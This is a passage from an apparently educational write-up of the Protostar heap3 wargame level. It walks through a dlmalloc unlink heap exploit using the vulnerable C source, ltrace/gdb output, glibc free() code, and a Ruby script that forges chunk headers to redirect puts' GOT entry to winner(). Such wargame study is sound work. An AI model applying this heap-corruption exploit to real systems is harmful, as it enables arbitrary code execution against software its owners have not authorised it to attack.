</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;that wasn&#39;t too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap3 1 2 3
</span><span class='line'>__libc_start_main(0x8048889, 4, 0xbffff854, 0x804ab50, 0x804ab40 &lt;unfinished ...>
</span><span class='line'>sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffff71c)             = 4096
</span><span class='line'>sbrk(4096)                                                     = 0x0804c000
</span><span class='line'>sbrk(0)                                                        = 0x0804d000
</span><span class='line'>strcpy(0x0804c008, "1")                                        = 0x0804c008
</span><span class='line'>strcpy(0x0804c030, "2")                                        = 0x0804c030
</span><span class='line'>strcpy(0x0804c058, "3")                                        = 0x0804c058
</span><span class='line'>puts("dynamite failed?"dynamite failed?
</span><span class='line'>)                                                              = 17
</span><span class='line'>+++ exited (status 17) +++</span></code></pre></td></tr></table></div></figure>


<p>We have three chunks at the appropriate addresses:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804c000: a-control
</span><span class='line'>(32) 0x0804c008: a
</span><span class='line'>
</span><span class='line'>(08) 0x0804c000: b-control
</span><span class='line'>(32) 0x0804c030: b
</span><span class='line'>
</span><span class='line'>(08) 0x0804c050: c-control
</span><span class='line'>(32) 0x0804c058: c</span></code></pre></td></tr></table></div></figure>


<p>There are a several great article about this topic, I recommend <a href="http://phrack.org/issues/57/8.html">Phrack 57/8</a>,
<a href="http://phrack.org/issues/57/9.html">Phrack 57/9</a>, <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html">Hackers Hut</a> to
explain the exploitation process in detail.</p>

<p>The malloc chunk could be considered as the following structure:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GNU C Library Implementation (used chunk):
</span><span class='line'>
</span><span class='line'>             +----------------------------------+
</span><span class='line'>    chunk -> | prev_size                        |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | size                         |M|P|
</span><span class='line'>             +----------------------------------+
</span><span class='line'>      mem -> | data                             |
</span><span class='line'>             : ...                              :
</span><span class='line'>             +----------------------------------+
</span><span class='line'>nextchunk -> | prev_size ...                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Once we free() the chunk:
</span><span class='line'>
</span><span class='line'>             +----------------------------------+
</span><span class='line'>    chunk -> | prev_size                        |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | size                         |M|P|
</span><span class='line'>             +----------------------------------+
</span><span class='line'>      mem -> | fd                               |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | bk                               |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | (old memory, can be zero bytes)  |
</span><span class='line'>             :                                  :
</span><span class='line'>
</span><span class='line'>nextchunk -> | prev_size ...                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>


<p>It is useful to download the <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.2.3.tar.gz">glibc 2.2.3</a> source code, we are
interested, how is the <code>free()</code> implemented:</p>

<figure class='code'><figcaption><span>malloc/malloc.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">..</span>
</span><span class='line'><span class="cp">#define unlink(P, BK, FD)                                                     \</span>
</span><span class='line'><span class="cp">{                                                                             \</span>
</span><span class='line'><span class="cp">  BK = P-&gt;bk;                                                                 \</span>
</span><span class='line'><span class="cp">  FD = P-&gt;fd;                                                                 \</span>
</span><span class='line'><span class="cp">  FD-&gt;bk = BK;                                                                \</span>
</span><span class='line'><span class="cp">  BK-&gt;fd = FD;                                                                \</span>
</span><span class='line'><span class="cp">}                                                                             \</span>
</span><span class='line'><span class="cp">..</span>
</span><span class='line'>  <span class="n">islr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">hd</span> <span class="o">&amp;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>                    <span class="cm">/* consolidate backward */</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">prevsz</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prev_size</span><span class="p">;</span>
</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">prevsz</span><span class="p">);</span>
</span><span class='line'>    <span class="n">sz</span> <span class="o">+=</span> <span class="n">prevsz</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>     <span class="cm">/* keep as last_remainder */</span>
</span><span class='line'>      <span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="nf">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">)))</span>   <span class="cm">/* consolidate forward */</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">sz</span> <span class="o">+=</span> <span class="n">nextsz</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">islr</span> <span class="o">&amp;&amp;</span> <span class="n">next</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>
</span><span class='line'>                                              <span class="cm">/* re-insert last_remainder */</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>      <span class="n">link_last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">unlink</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">next</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">set_head</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">);</span>                  <span class="cm">/* clear inuse bit */</span>
</span></code></pre></td></tr></table></div></figure>


<p>To call vulnerable <code>unlink()</code>, we have two branches, consolidate backward or consolidate forward.</p>

<p>We want to overwrite the jump to <code>printf/puts</code> function in <code>GOT</code> table with
the address of <code>winner()</code>.</p>

<p>Given the <code>bck</code> and <code>fwd</code> pointers that we could set arbitrary, <code>free()</code> will do <code>*(fwd+12) = bck</code>
and <code>*(bck+8) = fwd</code>. We use the first assignment to write to the arbitrary memory location.</p>

<p>Because the second assignment, we cannot simply write something to <code>.text</code> section (after <code>winner+0x8</code>),
but jumping to our shellcode stored in allocated memory would be efficient.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb> print /x 0x08048864+0x8
</span><span class='line'>$1 = 0x804886c
</span><span class='line'>
</span><span class='line'>gdb> maintenance info sections 
</span><span class='line'>Exec file:
</span><span class='line'>    `/opt/protostar/bin/heap3', file type elf32-i386.
</span><span class='line'>    0x8048114->0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048128->0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048148->0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804816c->0x8048234 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048234->0x804829c at 0x00000234: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804829c->0x804848c at 0x0000029c: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804848c->0x804859a at 0x0000048c: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804859a->0x80485d8 at 0x0000059a: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x80485d8->0x80485f8 at 0x000005d8: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x80485f8->0x8048608 at 0x000005f8: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048608->0x8048680 at 0x00000608: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048680->0x80486b0 at 0x00000680: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
</span><span class='line'>    0x80486b0->0x80487b0 at 0x000006b0: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
</span><span class='line'>==> 0x80487b0->0x804abdc at 0x000007b0: .text ALLOC LOAD READONLY CODE HAS_CONTENTS &lt;==
</span><span class='line'>    0x804abdc->0x804abf8 at 0x00002bdc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
</span><span class='line'>    0x804abf8->0x804aca0 at 0x00002bf8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804aca0->0x804aca4 at 0x00002ca0: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804b000->0x804b008 at 0x00003000: .ctors ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b008->0x804b010 at 0x00003008: .dtors ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b010->0x804b014 at 0x00003010: .jcr ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b014->0x804b0e4 at 0x00003014: .dynamic ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b0e4->0x804b0e8 at 0x000030e4: .got ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b0e8->0x804b130 at 0x000030e8: .got.plt ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b130->0x804b138 at 0x00003130: .data ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b140->0x804b5d4 at 0x00003138: .bss ALLOC
</span><span class='line'>    0x0000->0x3cfc at 0x00003138: .stab READONLY HAS_CONTENTS
</span><span class='line'>    0x0000->0x566a at 0x00006e34: .stabstr READONLY HAS_CONTENTS
</span><span class='line'>    0x0000->0x0039 at 0x0000c49e: .comment READONLY HAS_CONTENTS</span></code></pre></td></tr></table></div></figure>


<p>Exploit:</p>

<figure class='code'><figcaption><span>exploit-backward.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># user@protostar:~$ objdump -d /opt/protostar/bin/heap3 -M intel</span>
</span><span class='line'><span class="c1"># ...</span>
</span><span class='line'><span class="c1">#  8048935:       e8 56 fe ff ff          call   8048790 &lt;puts@plt&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># user@protostar:~$ objdump -TR /opt/protostar/bin/heap3 | grep &quot;R_386_JUMP_SLOT.* puts&quot;</span>
</span><span class='line'><span class="c1"># 0804b128 R_386_JUMP_SLOT   puts</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># gdb&gt; print /x 0x0804b128-0x0c</span>
</span><span class='line'><span class="c1"># $1 = 0x804b11c</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># user@protostar:~$ nm /opt/protostar/bin/heap3 | grep winner</span>
</span><span class='line'><span class="c1"># 08048864 T winner</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># root@kali32:~# rasm2 -C &#39;push 0x08048864; ret&#39;</span>
</span><span class='line'><span class="c1"># &quot;\x68\x64\x88\x04\x08\xc3&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># user@protostar:/tmp$ ltrace -e strcpy /opt/protostar/bin/heap3 a b c</span>
</span><span class='line'><span class="c1"># strcpy(0x0804c008, &quot;a&quot;)                              = 0x0804c008</span>
</span><span class='line'><span class="c1"># strcpy(0x0804c030, &quot;b&quot;)                              = 0x0804c030</span>
</span><span class='line'><span class="c1"># strcpy(0x0804c058, &quot;c&quot;)                              = 0x0804c058</span>
</span><span class='line'><span class="c1"># gdb&gt; print /x 0x0804c008 + 0x04</span>
</span><span class='line'><span class="c1"># $1 = 0x804c00c</span>
</span><span class='line'>
</span><span class='line'><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;/opt/protostar/bin/heap3&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># chunk1</span>
</span><span class='line'><span class="n">argv1</span>  <span class="o">=</span> <span class="s2">&quot;XXXX&quot;</span>                        <span class="c1"># user data, later overwritten by second free()</span>
</span><span class='line'><span class="n">argv1</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\x68\x64\x88\x04\x08\xc3</span><span class="s2">&quot;</span>    <span class="c1"># shellcode</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># chunk2</span>
</span><span class='line'><span class="n">argv2</span>  <span class="o">=</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;ABCDEFG&quot;</span> <span class="c1"># user data</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># chunk3</span>
</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0xfffffff8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># prev_size = -8 &amp;&amp; PREV_INUSE = 0</span>
</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0xfffffffc</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># size = -4</span>
</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x44444444</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># prev_size(unused) for fake chunk </span>
</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x45454545</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># size(unused) for fake chunk</span>
</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x0804b11c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># ret_loc-0x0c</span>
</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x0804c00c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># ret_addr</span>
</span><span class='line'><span class="n">argv3</span>  <span class="o">=</span> <span class="s2">&quot;X&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># *(0x0804b11c+12) = 0x0804c00c; *(0x0804c00c+8) = 0x0804b11c</span>
</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="sx">%x[ </span><span class="si">#{</span><span class="n">binary</span><span class="si">}</span><span class="sx"> &quot;</span><span class="si">#{</span><span class="n">argv1</span><span class="si">}</span><span class="sx">&quot; &quot;</span><span class="si">#{</span><span class="n">argv2</span><span class="si">}</span><span class="sx">&quot; &quot;</span><span class="si">#{</span><span class="n">argv3</span><span class="si">}</span><span class="sx">&quot; ]</span>
</span></code></pre></td></tr></table></div></figure>


<p>To explain the logic behind our code, because <code>size</code> has the lowest bit set as
<code>!PREV_INUSE</code> and <code>p</code> points to the beginning of our current chunk, we
triggered the following part of pseudocode with the first <code>free()</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">hd</span> <span class="o">&amp;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>                    <span class="cm">/* consolidate backward */</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">prevsz</span> <span class="o">=</span> <span class="o">-</span><span class="mi">8</span>
</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">+</span><span class="mi">8</span><span class="p">);</span>
</span><span class='line'>    <span class="n">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here the address of &ldquo;virtual chunk&rdquo; was computed and unlinked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">[</span><span class="mh">0x44444444</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="c1"># prev_size</span>
</span><span class='line'><span class="o">[</span><span class="mh">0x45454545</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="c1"># size</span>
</span><span class='line'><span class="o">[</span><span class="mh">0x0804b11c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="c1"># fwd</span>
</span><span class='line'><span class="o">[</span><span class="mh">0x0804c00c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="c1"># bck</span>
</span></code></pre></td></tr></table></div></figure>


<p>However, there is another test in consolidate forward:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
</span><span class='line'>    unlink(next, bck, fwd);
</span><span class='line'>
</span><span class='line'>0x08049918 &lt;free+244>: mov    eax,DWORD PTR [ebp-0x24] ; eax:FFFFFFF8 = -8
</span><span class='line'>0x0804991b &lt;free+247>: mov    edx,DWORD PTR [ebp-0x28] ; 0x804c04c: "DEFG\370\377\377\377\374\377\377\377X"
</span><span class='line'>0x0804991e &lt;free+250>: lea    eax,[edx+eax*1]          ; 0x804c044: "XXXX\001ABCDEFG\370\377\377\377\374\377\377\377X"
</span><span class='line'>0x08049921 &lt;free+253>: mov    eax,DWORD PTR [eax+0x4]  ; eax:43424101
</span><span class='line'>0x08049924 &lt;free+256>: and    eax,0x1                  ; eax:00000001 = PREV_INUSE flag
</span><span class='line'>0x08049927 &lt;free+259>: mov    DWORD PTR [ebp-0x20],eax ; 
</span><span class='line'>0x0804992a &lt;free+262>: mov    eax,DWORD PTR [ebp-0x28] ; 0x804c04c: "DEFG\370\377\377\377\374\377\377\377X"
</span><span class='line'>0x0804992d &lt;free+265>: mov    edx,DWORD PTR [ebp-0x24] ; edx:FFFFFFF8
</span><span class='line'>0x08049930 &lt;free+268>: mov    DWORD PTR [eax+0x4],edx  
</span><span class='line'>0x08049933 &lt;free+271>: cmp    DWORD PTR [ebp-0x20],0x0 ; PREV_INUSE set?</span></code></pre></td></tr></table></div></figure>


<p>Here we are verifying, if the <code>PREV_INUSE</code> flag is set <code>(0x43424101)</code>, so we
skipped the forward consolidation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">argv2</span>  <span class="o">=</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;ABCDEFG&quot;</span> <span class="c1"># user data</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
